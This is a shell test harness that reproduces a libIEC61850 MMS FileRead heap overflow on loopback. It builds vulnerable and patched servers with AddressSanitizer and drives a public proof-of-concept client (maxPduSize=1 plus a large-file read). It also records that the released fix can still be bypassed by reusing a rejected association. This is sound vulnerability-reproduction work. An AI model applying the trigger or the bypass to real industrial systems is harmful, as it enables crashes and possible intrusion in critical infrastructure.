#!/usr/bin/env bash
# Real-upstream libIEC61850 CVE-2026-49035 harness: loopback-only MMS service.
# Builds the pinned vulnerable a1396111 tip and released v1.6.2 with ASan,
# stages a local filestore file, and sends raw MMS packets from the pinned
# public PoC client to 127.0.0.1 only. No external host is contacted.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)

cd "$HERE/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" 2>&1 || exit 2
cd "$HERE" || exit 2

rm -rf "$OUT/build"
mkdir -p "$OUT/build"
tar -xzf "$HERE/src/libiec61850-a1396111.tar.gz" -C "$OUT/build" || exit 2
tar -xzf "$HERE/src/libiec61850-v1.6.2.tar.gz" -C "$OUT/build" || exit 2
tar -xzf "$HERE/src/libiec-security-poc-main.tar.gz" -C "$OUT/build" || exit 2
VULN="$OUT/build/libiec61850-a13961110b8238d2d8ea577c1fb7592ba3017ad8"
FIXED="$OUT/build/libiec61850-1.6.2"
POC="$OUT/build/libiec-security-poc-main/CVE-2026-49035-mms-fileread-heap-rce/poc/raw/exploit_raw.py"
[ -f "$POC" ] || exit 2

CFLAGS="-fsanitize=address -g -O0 -fno-omit-frame-pointer"
cmake -S "$VULN" -B "$OUT/build/bvuln" -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS="$CFLAGS" -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
  > "$OUT/cmake-vuln.log" 2>&1 || exit 2
cmake --build "$OUT/build/bvuln" --target server_example_files -- -j4 \
  >> "$OUT/cmake-vuln.log" 2>&1 || exit 2
cmake -S "$FIXED" -B "$OUT/build/bfixed" -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS="$CFLAGS" -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
  > "$OUT/cmake-fixed.log" 2>&1 || exit 2
cmake --build "$OUT/build/bfixed" --target server_example_files -- -j4 \
  >> "$OUT/cmake-fixed.log" 2>&1 || exit 2

# Local filestore: 200000 chosen-pattern bytes (rung-4 byte source, staged in
# the server's own VMD directory; no remote ObtainFile staging is claimed).
for D in "$OUT/build/bvuln/examples/server_example_files" "$OUT/build/bfixed/examples/server_example_files"; do
  mkdir -p "$D/vmd-filestore" || exit 2
  python3 -c "open('$D/vmd-filestore/TESTFILE.BIN','wb').write(bytes([0x5a,0xa5])*100000)" || exit 2
  python3 -c "open('$D/vmd-filestore/SMALLFILE.BIN','wb').write(bytes([0x5a,0xa5])*100)" || exit 2
done

export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
pass=0; fail=0
check() {
  if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
  else echo "FAIL $1"; fail=$((fail+1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }

# $1 server binary dir, $2 loopback port, $3 filename, $4 maxPduSize, $5 tag
case_run() {
  local dir=$1 port=$2 file=$3 pdu=$4 tag=$5 spid
  ( cd "$dir" && ./server_example_files "$port" ) > "$OUT/$tag.server.log" 2>&1 &
  spid=$!
  sleep 2
  python3 "$POC" 127.0.0.1 "$port" "$file" "$pdu" > "$OUT/$tag.client.log" 2>&1
  local crc=$?
  kill "$spid" 2>/dev/null
  wait "$spid" 2>/dev/null
  return "$crc"
}

BV="$OUT/build/bvuln/examples/server_example_files"
BF="$OUT/build/bfixed/examples/server_example_files"

# Rungs 1/2: unauthenticated loopback MMS Initiate with maxPduSize=1 and a
# FileRead of a 200000-byte file; rung 3: ASan in the real pinned server.
case_run "$BV" 10110 TESTFILE.BIN 1 hostile || true
hb=$(cat "$OUT/hostile.server.log")
ok=0
contains 'ERROR: AddressSanitizer: heap-buffer-overflow' "$hb" &&
contains 'WRITE of size 178157' "$hb" &&
contains 'mms_file_service.c:872' "$hb" &&
contains 'mms_file_service.c:896' "$hb" &&
contains '0 bytes after 65100-byte region' "$hb" &&
contains 'iso_connection.c:516' "$hb" && ok=1
check "rung1-3 loopback MMS FileRead ASan WRITE from pinned mms_file_service.c:872" "$ok"
check "client observed the loopback service crash" \
  "$(contains 'Server CRASH' "$(cat "$OUT/hostile.client.log")" && echo 1 || echo 0)"

# Negative controls: legal PDU size and small file are clean. The released
# fixed build is NOT a clean control on this route: its Initiate guard stores
# maxPduSize=1 before rejecting, and the raw client reuses the still-open
# association, so the later FileRead overflows anyway. Recorded as a negative
# result about the fix, not as a grade claim for this find.
case_run "$BV" 10111 TESTFILE.BIN 20 legalpdu || true
lp=$(cat "$OUT/legalpdu.server.log")
check "maxPduSize=20 control: no ASan report" \
  "$(! contains 'AddressSanitizer' "$lp" && echo 1 || echo 0)"
case_run "$BV" 10112 SMALLFILE.BIN 1 smallfile || true
sf=$(cat "$OUT/smallfile.server.log")
check "200-byte file control: no ASan report" \
  "$(! contains 'AddressSanitizer' "$sf" && echo 1 || echo 0)"
case_run "$BF" 10113 TESTFILE.BIN 1 fixed || true
fx=$(cat "$OUT/fixed.server.log")
check "released v1.6.2 still overflows when the raw client reuses the rejected association" \
  "$(contains 'WRITE of size 178157' "$fx" && echo 1 || echo 0)"
fc=$(cat "$OUT/fixed.client.log")
check "fixed server rejected Initiate (no 0xa9 response) before the later FileRead" \
  "$(contains 'got 0x08' "$fc" && echo 1 || echo 0)"

# Determinism: two three-run groups; ASan lines are reduced to stable field
# text (no PID, address or path), so digests match across fresh builds.
signature() {
  sed -E 's/==[0-9]+==/==PID==/g; s/0x[0-9a-f]+/ADDR/g; s#/[^ ]*/##g' "$1" |
    grep -E 'ERROR: AddressSanitizer|WRITE of size|mms_file_service.c:872|0 bytes after 65100-byte region'
}
run_group() {
  local i
  for i in 1 2 3; do
    case_run "$BV" $((10120+i)) TESTFILE.BIN 1 "group$i" || true
    signature "$OUT/group$i.server.log"
  done
}
h1=$(run_group | sha256sum | cut -d' ' -f1)
h2=$(run_group | sha256sum | cut -d' ' -f1)
echo "sha256=$h1 sha256_b=$h2 (two independent 3-run groups)"
check "determinism: two 3-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
